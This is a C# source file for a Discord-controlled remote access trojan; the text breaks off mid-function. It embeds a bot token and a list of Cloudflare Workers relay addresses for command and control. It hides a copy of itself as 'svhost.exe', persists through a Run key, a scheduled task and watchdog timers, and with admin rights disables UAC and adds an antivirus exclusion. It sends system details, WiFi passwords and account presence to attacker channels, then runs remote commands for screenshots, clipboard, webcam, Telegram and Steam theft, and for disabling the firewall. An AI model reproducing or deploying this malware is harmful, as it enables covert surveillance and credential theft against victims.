using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Diagnostics;
using System.Security.Principal;
using NAudio.Wave;
using NAudio.Lame;
using NAudio.CoreAudioApi;
using Microsoft.Win32;
using System.Speech.Synthesis;
using System.Net.NetworkInformation;
using System.Management;
using System.IO.Compression;
using System.Text.RegularExpressions;
using AForge.Video.DirectShow;
using System.Reflection;
using System.Data;
using AForge.Video;

public class Program
{
    private static readonly string Token = "MTM0MjUyNjA5NzM5NjMzODc4OQ.G7PHcS.Rjy1y38Im-RXmYBXbaMVF5jd5d8BidW9_9dtUY"; // توکن ربات شما
    private static readonly ulong ServerId = 1342526062118178887; // آیدی سرور شما
    private static readonly ulong GlobalChannelId = 1342526063749627956; // آیدی کانال مورد نظر

    private static string khoderat = Process.GetCurrentProcess().MainModule.FileName;
    private static bool addedantivirus = false;



    private static IWavePlayer waveOutDevice;
    private static AudioFileReader audioFileReader;
    private static bool inputBlocked = false;
    static System.Threading.Timer registryMonitorTimer;

    /// </summary>
    // شناسه کانال اختصاصی (برای هر سیستم)
    private static ulong DedicatedChannelId;

    private static HttpClient ClientWithoutProxy;
    private static readonly string[] BaseAddresses = new string[]
    {
    "https://nameless-sunset-7523.sduoqs.workers.dev/api/",
    "https://ancient-boat-b8cc.ssna4w.workers.dev/api/",
    "https://muddy-frost-def9.9lxmh.workers.dev/api/",
    "https://green-unit-c364.0qfit.workers.dev/api/",
    "https://royal-cloud-30ea.v9qf5.workers.dev/api/",
    "https://cold-fog-65e7.3bo05.workers.dev/api/",
    "https://billowing-meadow-df5e.espzn.workers.dev/api/",
    "https://lively-wildflower-2a3d.s8akh.workers.dev/api/",
    "https://fancy-brook-9d0e.u9lkvp.workers.dev/api",
    "https://gentle-unit-c214.0hbdef.workers.dev/api",
    "https://nameless-voice-49dc.9wd1cx.workers.dev/api",
    "https://discord.ajabp33.workers.dev/api/"
    };

    private static async Task InitializeHttpClientAsync()
    {
        // برای هر آدرس یک تسک ایجاد می‌کنیم که وضعیت دسترسی آن را بررسی می‌کند.
        var tasks = BaseAddresses.Select(address => CheckAddressAsync(address)).ToList();

        while (tasks.Any())
        {
            // اولین تسکی که به پایان رسید (چه موفق و چه ناموفق) را دریافت می‌کنیم.
            var completedTask = await Task.WhenAny(tasks);
            tasks.Remove(completedTask);

            var result = await completedTask;
            if (result.success)
            {
                // در صورت دریافت پاسخ موفق، از این آدرس استفاده می‌کنیم.
                ClientWithoutProxy = new HttpClient { BaseAddress = new Uri(result.address), Timeout = TimeSpan.FromSeconds(20) };
                ClientWithoutProxy.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", Token);

                return;
            }
        }

        // اگر هیچ کدام از آدرس‌ها پاسخ موفق ندادند، به عنوان پیش‌فرض از اولین آدرس استفاده می‌کنیم.
        ClientWithoutProxy = new HttpClient { BaseAddress = new Uri("https://discord.com/api/v10") };
        ClientWithoutProxy.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", Token);
    }

    private static async Task<(string address, bool success)> CheckAddressAsync(string address)
    {
        try
        {
            using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(20) })
            {
                client.BaseAddress = new Uri(address);
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", Token);

                // ارسال درخواست به آدرس پایه
                var response = await client.GetAsync("");
                var content = await response.Content.ReadAsStringAsync();

                // بررسی پاسخ: اگر دقیقا متن {"message": "404: Not Found", "code": 0} دریافت شود، آدرس معتبر است.
                if (content.Trim() == "{\"message\": \"404: Not Found\", \"code\": 0}")
                {
                    return (address, true);
                }
                else
                {
                    return (address, false);
                }
            }
        }
        catch
        {
            return (address, false);
        }
    }



    // صف پیام‌ها (از هر دو کانال)
    private static readonly ConcurrentQueue<Message> messageQueue = new ConcurrentQueue<Message>();
    // قفل برای پردازش پیام‌ها
    private static readonly SemaphoreSlim messageLock = new SemaphoreSlim(1, 1);
    // توکن لغو عملیات
    private static readonly CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();

    // افزودن برنامه به استارت آپ با استفاده از رجیستری (HKCU)
    static void AddToStartup(string programPath)
    {
        string key = @"Software\Microsoft\Windows\CurrentVersion\Run";
        string keyName = "SecCenter";
        try
        {
            using (RegistryKey regKey = Registry.CurrentUser.OpenSubKey(key, true) ?? Registry.CurrentUser.CreateSubKey(key))
            {
                if (regKey.GetValue(keyName) == null)
                {
                    regKey.SetValue(keyName, programPath);
                }
            }
        }
        catch (Exception ex)
        {
            // مدیریت خطا
        }
    }

    // کپی فایل اجرایی به پوشه Local\Windows Explorer و تنظیم ویژگی‌های مخفی (Hidden و System)
    static void SetupStartup()
    {
        string exePath = Environment.GetCommandLineArgs()[0];
        string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Windows Security");

        try
        {
            if (!Directory.Exists(targetDir))
            {
                Directory.CreateDirectory(targetDir);
                DirectoryInfo di = new DirectoryInfo(targetDir);
                di.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;
            }

            string copyPath = Path.Combine(targetDir, "svhost.exe");

            if (!File.Exists(copyPath))
            {
                File.Copy(exePath, copyPath);
                File.SetAttributes(copyPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
            }

            AddToStartup(copyPath);
            CreateScheduledTask(); // تابع اصلاح‌شده بدون نیاز به Administrator
        }
        catch (Exception ex)
        {
            // مدیریت خطا
        }
    }

    // ایجاد تسک زمان‌بندی شده (Scheduled Task) که هر 5 دقیقه برنامه را اجرا می‌کند
    static void CreateScheduledTask()
    {
        try
        {
            string taskName = "File Explorer Persistence";
            string exePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Windows Security", "Security.exe");

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/create /tn \"{taskName}\" /tr \"{exePath}\" /sc minute /mo 5 /f /sc onlogon",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(psi).WaitForExit();
        }
        catch (Exception ex)
        {
            // مدیریت خطا
        }
    }


    static void StartRegistryMonitor()
    {
        registryMonitorTimer = new System.Threading.Timer((e) =>
        {
            string runKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
            string startupApprovedPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
            string keyName = "SecCenter";
            string keyData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Windows Security", "Security.exe");

            try
            {
                using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey(runKeyPath, true))
                {
                    if (runKey == null || runKey.GetValue(keyName) == null)
                    {
                        AddToStartup(keyData);
                    }
                }

                using (RegistryKey approvedKey = Registry.CurrentUser.OpenSubKey(startupApprovedPath, true) ?? Registry.CurrentUser.CreateSubKey(startupApprovedPath))
                {
                    byte[] approvalData = (byte[])approvedKey.GetValue(keyName);
                    if (approvalData != null && approvalData.Length >= 1 && approvalData[0] != 2) // 2 = Enabled
                    {
                        approvedKey.SetValue(keyName, new byte[] { 2 }, RegistryValueKind.Binary);
                    }
                }
            }
            catch (Exception ex)
            {
                // مدیریت خطا
            }
        }, null, TimeSpan.Zero, TimeSpan.FromMinutes(1));
    }
    static System.Threading.Timer taskMonitorTimer;

    static void StartTaskMonitor()
    {
        taskMonitorTimer = new System.Threading.Timer((e) =>
        {
            try
            {
                string taskName = "File Explorer Persistence";
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = $"/query /tn \"{taskName}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0) // تسک وجود ندارد
                {
                    CreateScheduledTask(); // بازسازی تسک بدون نیاز به Administrator
                }
            }
            catch (Exception ex)
            {
                // مدیریت خطا
            }
        }, null, TimeSpan.Zero, TimeSpan.FromMinutes(5));
    }

    public static async Task Main(string[] args)
    {
        await InitializeHttpClientAsync();

        SetupStartup();

        // 2. شروع نظارت بر رجیستری
        StartRegistryMonitor();

        // 3. شروع نظارت بر تسک زمان‌بندی‌شده
        StartTaskMonitor();
        bool allSuccess = false;


        if (IsAdministrator())
        {
            allSuccess = true;

            try
            {
                // 1- Disable UAC
                if (DisableUAC())
                    allSuccess = false;
            }
            catch (Exception)
            {
                allSuccess = false;
            }

            try
            {
                // 2- Add path as an exception in Antivirus (Windows Defender)
                if (AddAntivirusException())
                    addedantivirus = true;

                allSuccess = false;
            }
            catch (Exception)
            {
                allSuccess = false;
            }

            try
            {
                // 3- Set exe files to run as admin
                if (SetExeFilesToRunAsAdmin())
                    allSuccess = false;
            }
            catch (Exception)
            {
                allSuccess = false;
            }

        }



        // ارسال پیام آغاز کار در کانال عمومی
        // await SafeSendMessageAsync("ربات آنلاین است.", GlobalChannelId);
        await Task.Delay(500);
        try
        {
            StringBuilder infoText = new StringBuilder();

            // Computer info
            infoText.AppendLine("💻 Computer info:");
            infoText.AppendLine("User name: " + Environment.UserName);
            infoText.AppendLine("System: " + GetSystemVersion());
            infoText.AppendLine("Computer name: " + Environment.MachineName);
            infoText.AppendLine("System time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
            infoText.AppendLine("UAC: " + GetUACLevel());
            infoText.AppendLine("Low security started: " + allSuccess);

            // Protection info
            infoText.AppendLine("\n👾 Protection:");
            infoText.AppendLine("Installed antivirus: " + DetectAntivirus());
            infoText.AppendLine("Active antivirus: " + GetActiveAntiviruses());
            infoText.AppendLine("Started as admin: " + IsAdministrator());
            //infoText.AppendLine("Hidden startup: " + vaziat);

            try
            {
                infoText.AppendLine("Debugger: " + inDebugger());
                infoText.AppendLine("Sandboxie: " + inSandboxie());
                infoText.AppendLine("VirtualBox: " + inVirtualBox());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting protection info: " + ex.Message);
            }



            // account info
            infoText.AppendLine("\n🎁 Account:");
            try
            {
                infoText.AppendLine("Telegram: " + telegraminstall());
                infoText.AppendLine("Eita: " + eitaainstall());
                infoText.AppendLine("Discord: " + discordinstall());
                infoText.AppendLine("Steam: " + steaminstall());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting account info: " + ex.Message);
            }

            // Hardware info
            infoText.AppendLine("\n📇 Hardware:");
            try
            {
                infoText.AppendLine("CPU: " + GetCPUName());
                infoText.AppendLine("GPU: " + GetGPUName());
                infoText.AppendLine("RAM: " + GetRamAmount() + "MB");
                infoText.AppendLine("HWID: " + GetHWID());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting hardware info: " + ex.Message);
            }

            try
            {
                // Network info
                infoText.AppendLine("\n🌐 Network:");
                infoText.AppendLine("SSID: " + GetSSID());
                infoText.AppendLine("Network name: " + GetNetworkName());
                infoText.AppendLine("Network adapter: " + GetNetworkAdapterName());
                infoText.AppendLine("WiFi password: " + GetWifiPassword());
                infoText.AppendLine("Network speed: " + GetNetworkSpeed());
                infoText.AppendLine("VPN connected: " + IsConnectedToVPN());
                infoText.AppendLine("Available networks: " + GetAvailableNetworksCount());
                infoText.AppendLine("Local IP address: " + GetLocalIPAddress());

            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting network info: " + ex.Message);
            }

            // === بخش جدید: دریافت و نمایش کشور ===
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    // درخواست به API برای دریافت اطلاعات آی‌پی
                    string response = await httpClient.GetStringAsync("http://ip-api.com/json");
                    // پارس کردن خروجی JSON
                    IpInfo ipInfo = JsonSerializer.Deserialize<IpInfo>(response);
                    if (ipInfo != null && ipInfo.status.Equals("success", StringComparison.OrdinalIgnoreCase))
                    {
                        infoText.AppendLine("🌍 Country: " + ipInfo.country);
                    }
                    else
                    {
                        infoText.AppendLine("Country: Unable to determine country.");
                    }
                }
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Country: Error retrieving country info: " + ex.Message);
            }
            // Get hard drive information
            infoText.AppendLine("\n📭 Hard:");

            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject hardDrive in searcher.Get())
                {
                    infoText.AppendLine("Drive: " + hardDrive["Model"].ToString());
                    infoText.AppendLine("Capacity: " + ConvertToGB(hardDrive["Size"].ToString()) + " GB");
                }
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting hard drive info: " + ex.Message);
            }

            // Get drive information
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                infoText.AppendLine("\n💿 Drive:");
                foreach (DriveInfo drive in drives)
                {
                    if (drive.IsReady)
                    {
                        infoText.AppendLine("Drive " + drive.Name);
                        infoText.AppendLine("Total Space: " + ConvertToGB(drive.TotalSize) + " GB");
                    }
                }
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting drive info: " + ex.Message);
            }

            if (infoText.Length >= 1980)
            {
                string tempPath = Path.GetTempFileName();
                File.WriteAllText(tempPath, infoText.ToString());

                try
                {
                    using (var fileStream = new FileStream(tempPath, FileMode.Open))
                    {
                        long fileSize = fileStream.Length;
                        byte[] fileBytes = new byte[fileSize];
                        await fileStream.ReadAsync(fileBytes, 0, (int)fileSize);

                        // Convert byte array to MemoryStream
                        using (var memoryStream = new MemoryStream(fileBytes))
                        {
                            // Send the file as an attachment using MemoryStream
                            await SendFileAsync(memoryStream, "output.txt", "Here's the output:", GlobalChannelId);
                        }
                    }
                }
                catch (Exception ex)
                {
                    await SendMessageAsync($"Error occurred while sending the file: {ex.Message}", GlobalChannelId);
                }
                finally
                {
                    // Delete the temporary file
                    File.Delete(tempPath);
                }
            }

            else
            {
                //await channel.SendMessageAsync(infoText.ToString());
                await SendMessageAsync("```info\n" + infoText.ToString() + "\n```", GlobalChannelId);

            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"❌ Error: {ex.Message}", GlobalChannelId);
        }




        // تلاش برای ایجاد کانال اختصاصی جدید؛ در صورت شکست به آخرین کانال اختصاصی موجود متصل می‌شویم
        DedicatedChannelId = await EnsureDedicatedChannelExistsAsync();
        if (DedicatedChannelId != 0)
        {
            //await SafeSendMessageAsync($"ربات {Environment.UserName} آنلاین است.", DedicatedChannelId);

            await Task.Delay(800);
            try
            {
                StringBuilder infoText = new StringBuilder();

                // Computer info
                infoText.AppendLine("💻 Computer info:");
                infoText.AppendLine("User name: " + Environment.UserName);
                infoText.AppendLine("System: " + GetSystemVersion());
                infoText.AppendLine("Computer name: " + Environment.MachineName);
                infoText.AppendLine("System time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
                infoText.AppendLine("UAC: " + GetUACLevel());
                infoText.AppendLine("Bypass antivirus: " + addedantivirus);
                infoText.AppendLine("Low security started: " + allSuccess);




                // Protection info
                infoText.AppendLine("\n👾 Protection:");
                infoText.AppendLine("Installed antivirus: " + DetectAntivirus());
                infoText.AppendLine("Active antivirus: " + GetActiveAntiviruses());
                infoText.AppendLine("Started as admin: " + IsAdministrator());
                //infoText.AppendLine("Hidden startup: " + vaziat);

                try
                {
                    infoText.AppendLine("Debugger: " + inDebugger());
                    infoText.AppendLine("Sandboxie: " + inSandboxie());
                    infoText.AppendLine("VirtualBox: " + inVirtualBox());
                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Error getting protection info: " + ex.Message);
                }



                // account info
                infoText.AppendLine("\n🎁 Account:");
                try
                {
                    infoText.AppendLine("Telegram: " + telegraminstall());
                    infoText.AppendLine("Eita: " + eitaainstall());
                    infoText.AppendLine("Discord: " + discordinstall());
                    infoText.AppendLine("Steam: " + steaminstall());
                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Error getting account info: " + ex.Message);
                }

                // Hardware info
                infoText.AppendLine("\n📇 Hardware:");
                try
                {
                    infoText.AppendLine("CPU: " + GetCPUName());
                    infoText.AppendLine("GPU: " + GetGPUName());
                    infoText.AppendLine("RAM: " + GetRamAmount() + "MB");
                    infoText.AppendLine("HWID: " + GetHWID());
                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Error getting hardware info: " + ex.Message);
                }
                try
                {
                    // Network info
                    infoText.AppendLine("\n🌐 Network:");
                    infoText.AppendLine("SSID: " + GetSSID());
                    infoText.AppendLine("Network name: " + GetNetworkName());
                    infoText.AppendLine("Network adapter: " + GetNetworkAdapterName());
                    infoText.AppendLine("WiFi password: " + GetWifiPassword());
                    infoText.AppendLine("Network speed: " + GetNetworkSpeed());
                    infoText.AppendLine("VPN connected: " + IsConnectedToVPN());
                    infoText.AppendLine("Available networks: " + GetAvailableNetworksCount());
                    infoText.AppendLine("Local IP address: " + GetLocalIPAddress());

                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Error getting network info: " + ex.Message);
                }

                // === بخش جدید: دریافت و نمایش کشور ===
                try
                {
                    using (HttpClient httpClient = new HttpClient())
                    {
                        // درخواست به API برای دریافت اطلاعات آی‌پی
                        string response = await httpClient.GetStringAsync("http://ip-api.com/json");
                        // پارس کردن خروجی JSON
                        IpInfo ipInfo = JsonSerializer.Deserialize<IpInfo>(response);
                        if (ipInfo != null && ipInfo.status.Equals("success", StringComparison.OrdinalIgnoreCase))
                        {
                            infoText.AppendLine("🌍 Country: " + ipInfo.country);
                        }
                        else
                        {
                            infoText.AppendLine("Country: Unable to determine country.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Country: Error retrieving country info: " + ex.Message);
                }
                // Get hard drive information
                infoText.AppendLine("\n📭 Hard:");

                try
                {
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                    foreach (ManagementObject hardDrive in searcher.Get())
                    {
                        infoText.AppendLine("Drive: " + hardDrive["Model"].ToString());
                        infoText.AppendLine("Capacity: " + ConvertToGB(hardDrive["Size"].ToString()) + " GB");
                    }
                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Error getting hard drive info: " + ex.Message);
                }

                // Get drive information
                try
                {
                    DriveInfo[] drives = DriveInfo.GetDrives();
                    infoText.AppendLine("\n💿 Drive:");
                    foreach (DriveInfo drive in drives)
                    {
                        if (drive.IsReady)
                        {
                            infoText.AppendLine("Drive " + drive.Name);
                            infoText.AppendLine("Total Space: " + ConvertToGB(drive.TotalSize) + " GB");
                        }
                    }
                }
                catch (Exception ex)
                {
                    infoText.AppendLine("Error getting drive info: " + ex.Message);
                }

                if (infoText.Length >= 1980)
                {
                    string tempPath = Path.GetTempFileName();
                    File.WriteAllText(tempPath, infoText.ToString());

                    try
                    {
                        using (var fileStream = new FileStream(tempPath, FileMode.Open))
                        {
                            long fileSize = fileStream.Length;
                            byte[] fileBytes = new byte[fileSize];
                            await fileStream.ReadAsync(fileBytes, 0, (int)fileSize);

                            // Convert byte array to MemoryStream
                            using (var memoryStream = new MemoryStream(fileBytes))
                            {
                                // Send the file as an attachment using MemoryStream
                                await SendFileAsync(memoryStream, "output.txt", "Here's the output:", DedicatedChannelId);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        await SendMessageAsync($"Error occurred while sending the file: {ex.Message}", DedicatedChannelId);
                    }
                    finally
                    {
                        // Delete the temporary file
                        File.Delete(tempPath);
                    }
                }

                else
                {
                    //await channel.SendMessageAsync(infoText.ToString());
                    await SendMessageAsync("```info\n" + infoText.ToString() + "\n```", DedicatedChannelId);

                }
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"❌ Error: {ex.Message}", DedicatedChannelId);
            }

        }
        else
        {
        }

        // راه‌اندازی تسک‌های مربوط به مانیتورینگ اتصال و دریافت پیام‌ها از هر دو کانال
        var tasks = new List<Task>
        {
            MonitorConnectivityAsync(cancellationTokenSource.Token),
            PollMessagesFromChannelAsync(GlobalChannelId, cancellationTokenSource.Token)
        };

        // اگر کانال اختصاصی موجود بود، آن را هم اضافه می‌کنیم.
        if (DedicatedChannelId != 0)
        {
            tasks.Add(PollMessagesFromChannelAsync(DedicatedChannelId, cancellationTokenSource.Token));
        }
        tasks.Add(ProcessQueueAsync(cancellationTokenSource.Token));

        await Task.WhenAll(tasks);
    }

    private static async Task SafeSendMessageAsync(string message, ulong channelId)
    {
        try
        {
            await SendMessageAsync(message, channelId);
        }
        catch (Exception ex)
        {
        }
    }

    private static async Task SendMessageAsync(string message, ulong channelId)
    {
        var payload = new { content = message };
        var jsonPayload = JsonSerializer.Serialize(payload);
        var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

        var requestUrl = $"v10/channels/{channelId}/messages";

        HttpResponseMessage response = null;
        try
        {
            response = await ClientWithoutProxy.PostAsync(requestUrl, content);

        }
        finally
        {
            response?.Dispose();
        }
    }

    /// <summary>
    /// تلاش برای ایجاد کانال اختصاصی؛ در صورت شکست، به آخرین کانال با نام سیستم متصل می‌شود.
    /// اگر هیچ کانالی یافت نشود، مقدار 0 برگردانده می‌شود تا فقط به کانال عمومی متصل شویم.
    /// </summary>
    private static async Task<ulong> EnsureDedicatedChannelExistsAsync()
    {
        try
        {
            var createChannelUrl = $"v10/guilds/{ServerId}/channels";
            var payload = new
            {
                name = Environment.UserName,
                type = 0 // Text channel
            };
            var jsonPayload = JsonSerializer.Serialize(payload);
            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            var response = await ClientWithoutProxy.PostAsync(createChannelUrl, content);
            if (response.IsSuccessStatusCode)
            {
                var json = await response.Content.ReadAsStringAsync();
                var newChannel = JsonSerializer.Deserialize<Channel>(json);
                if (newChannel != null)
                {
                    return ulong.Parse(newChannel.id);
                }
            }
            else
            {
            }
        }
        catch (Exception ex)
        {
        }

        try
        {
            var requestUrl = $"v10/guilds/{ServerId}/channels";
            var response = await ClientWithoutProxy.GetAsync(requestUrl);
            if (response.IsSuccessStatusCode)
            {
                var json = await response.Content.ReadAsStringAsync();
                var channels = JsonSerializer.Deserialize<List<Channel>>(json);
                var dedicatedChannels = channels?.Where(c => c.name == Environment.UserName).ToList();
                if (dedicatedChannels != null && dedicatedChannels.Count > 0)
                {
                    var lastChannel = dedicatedChannels.OrderByDescending(c => ulong.Parse(c.id)).First();
                    return ulong.Parse(lastChannel.id);
                }
            }

        }
        catch (Exception ex)
        {
        }
        return 0;
    }

    /// <summary>
    /// نظارت بر اتصال اینترنت (به عنوان مثال با مراجعه به google)
    /// </summary>
    private static async Task MonitorConnectivityAsync(CancellationToken token)
    {
        while (!token.IsCancellationRequested)
        {
            try
            {
                using (var httpClient = new HttpClient())
                using (var response = await httpClient.GetAsync("https://www.google.com", token))
                {

                }
            }
            catch
            {
            }

            await Task.Delay(20000, token);
        }
    }

    /// <summary>
    /// دریافت پیام‌ها از یک کانال مشخص (عمومی یا اختصاصی)
    /// </summary>
    private static async Task PollMessagesFromChannelAsync(ulong channelId, CancellationToken token)
    {
        string lastMessageId = null;
        while (!token.IsCancellationRequested)
        {
            try
            {
                var requestUrl = $"v10/channels/{channelId}/messages?limit=10";
                HttpResponseMessage response = await ClientWithoutProxy.GetAsync(requestUrl, token);

                if (response.IsSuccessStatusCode)
                {
                    var json = await response.Content.ReadAsStringAsync();
                    var messages = JsonSerializer.Deserialize<List<Message>>(json);

                    if (messages != null && messages.Count > 0)
                    {
                        if (string.IsNullOrEmpty(lastMessageId))
                        {
                            lastMessageId = messages[0].id;
                        }
                        else
                        {
                            var newMessages = messages
                                .Where(m => ulong.Parse(m.id) > ulong.Parse(lastMessageId))
                                .OrderBy(m => ulong.Parse(m.id));

                            foreach (var msg in newMessages)
                            {
                                msg.channel_id = channelId.ToString();
                                messageQueue.Enqueue(msg);
                                lastMessageId = msg.id;
                            }
                        }
                    }
                }
                else
                {
                }
            }
            catch (Exception ex)
            {
            }

            await Task.Delay(1000, token);
        }
    }

    /// <summary>
    /// پردازش پیام‌هایی که در صف قرار دارند (از هر دو کانال) به صورت موازی
    /// </summary>
    private static async Task ProcessQueueAsync(CancellationToken token)
    {
        while (!token.IsCancellationRequested)
        {
            if (messageQueue.TryDequeue(out var msg))
            {
                _ = Task.Run(async () =>
                {
                    try
                    {
                        await ProcessMessageAsync(msg);
                    }
                    catch (Exception ex)
                    {
                    }
                }, token);
            }
            else
            {
                await Task.Delay(100, token);
            }
        }
    }

    /// <summary>
    /// پردازش هر پیام دریافتی؛ بسته به کانالی که پیام از آن آمده دستور را اجرا می‌کند.
    /// </summary>
    private static async Task ProcessMessageAsync(Message msg)
    {
        try
        {
            if (msg.author == null || msg.author.bot)
                return;

            // تعیین کانال پاسخ‌دهی
            ulong replyChannelId = msg.channel_id == GlobalChannelId.ToString() ? GlobalChannelId : DedicatedChannelId;
            string trimmedContent = msg.content.Trim();

            // اگر پیام در کانال عمومی (global) ارسال شده باشد
            if (msg.channel_id == GlobalChannelId.ToString())
            {
                // بررسی الگوی /systemName/ در ابتدای پیام
                var match = Regex.Match(trimmedContent, @"^\/([^\/]+)\/\s*(.+)$");
                if (match.Success)
                {
                    string targetSystem = match.Groups[1].Value.Trim(); // نام سیستم هدف
                    string command = match.Groups[2].Value.Trim();       // دستور اصلی

                    // اگر نام سیستم هدف با نام سیستم فعلی مطابقت نداشته باشد، پیام را نادیده می‌گیریم
                    if (!targetSystem.Equals(Environment.UserName, StringComparison.OrdinalIgnoreCase))
                        return;

                    // در این حالت فقط این سیستم دستور را اجرا می‌کند
                    trimmedContent = command;
                }
                // اگر الگو وجود نداشت، یعنی دستور بدون فیلتر سیستم ارسال شده؛
                // در نتیجه این دستور بر روی همه سیستم‌ها (از جمله سیستم فعلی) اجرا خواهد شد.
            }
            // Switch برای دستورات ساده
            switch (trimmedContent.ToLowerInvariant())
            {
                case "users":
                    await UsersInfoo(replyChannelId);
                    break;

                case "pwd":
                    await ExecutePwdCommand(replyChannelId);
                    break;
                case "dir":
                    await ListAllFilesAndFolders(replyChannelId);
                    break;
                case "ls":
                    await ListCurrentDirectoryContents(replyChannelId);
                    break;
                case "pross":
                    await ListProcesses(replyChannelId);
                    break;
                case "my_pross":
                    await ListMyProcess(replyChannelId);
                    break;
                case "stop_taskmanager":
                    await StopTaskManager(replyChannelId);
                    break;
                case "start_taskmanager":
                    await StartTaskManager(replyChannelId);
                    break;
                case "start_firewall":
                    await StartFirewall(replyChannelId);
                    break;
                case "sttop_firewall":
                    await StopFirewall(replyChannelId);
                    break;
                case "clipboard":
                    await SendClipboardContents(replyChannelId);
                    break;
                case "help":
                    await SendHelpMessage(replyChannelId);
                    break;
                case "minimize":
                    await MinimizeAllWindowsAsync(replyChannelId);
                    break;
                case "maximize":
                    await MaximizeAllWindowsAsync(replyChannelId);
                    break;
                case "network":
                    int to = 254;
                    await NetDiscover(replyChannelId, to);
                    break;
                case "info":
                    await SystemInfo(replyChannelId);
                    break;
                case "getwebcam":
                    await GetConnectedWebcams(replyChannelId);
                    break;
                case "telegram":
                    await TelegramGetAsync(replyChannelId);
                    break;
                case "steam":
                    await SteamGetAsync(replyChannelId);
                    break;
                case "admin":
                    await runappadmin(replyChannelId);
                    break;
                case "force_admin":
                    await fRunAppAdmin(replyChannelId);
                    break;
                case "uac":
                    await StopUACAsync(replyChannelId);
                    break;
                case "folder":
                    await ChangeToLocalAppDataFolder(replyChannelId);
                    break;
                case "all_download":
                    await AllDownloadFiles(replyChannelId);
                    break;
                case "video":
                    await ChangeToVideos(replyChannelId);
                    break;
                case "pictures":
                    await ChangeToPictures(replyChannelId);
                    break;
                case "desktop":
                    await ChangeToDesktop(replyChannelId);
                    break;
                case "reset":
                    await Resett(replyChannelId);
                    break;
                case "low_security":
                    await RunOperations(replyChannelId);
                    break;
                case "hide_icon":
                    await Hideicon(replyChannelId);
                    break;
                case "show_icon":
                    await Showicon(replyChannelId);
                    break;
                case "say_goodby":
                    await Gayesh(replyChannelId);
                    break;
                default:

                    // if برای دستورات پیچیده‌تر
                    if (trimmedContent.StartsWith("box ", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string messageText = trimmedContent.Substring(4).Trim();
                            MessageBox.Show(messageText, "Message Box", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            await SafeSendMessageAsync($"'{messageText}' نمایش داده شد.", replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("shot ", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {


                            if (int.TryParse(trimmedContent.Substring(5).Trim(), out int shotCount))
                            {
                                _ = Task.Run(async () =>
                                {
                                    await ProcessShotCommand(shotCount, replyChannelId);
                                });
                                await SafeSendMessageAsync($"Start send {shotCount} screenshot from {Environment.UserName}", replyChannelId);
                            }
                            else
                            {
                                await SafeSendMessageAsync("تعداد اسکرین شات معتبر نیست.", replyChannelId);
                            }
                        });
                    }

                    else if (trimmedContent.StartsWith("webview", StringComparison.OrdinalIgnoreCase))
                    {
                        string url = trimmedContent.Substring("webview".Length).Trim();
                        await OpenUrlInDefaultBrowser(url, replyChannelId);
                    }
                    else if (trimmedContent.StartsWith("wallpaper", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string content = trimmedContent;
                            if (Uri.TryCreate(content.Substring("wallpaper".Length).Trim(), UriKind.Absolute, out var uriResult)
                                && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps))
                            {
                                string imageUrl = content.Substring("wallpaper".Length).Trim();
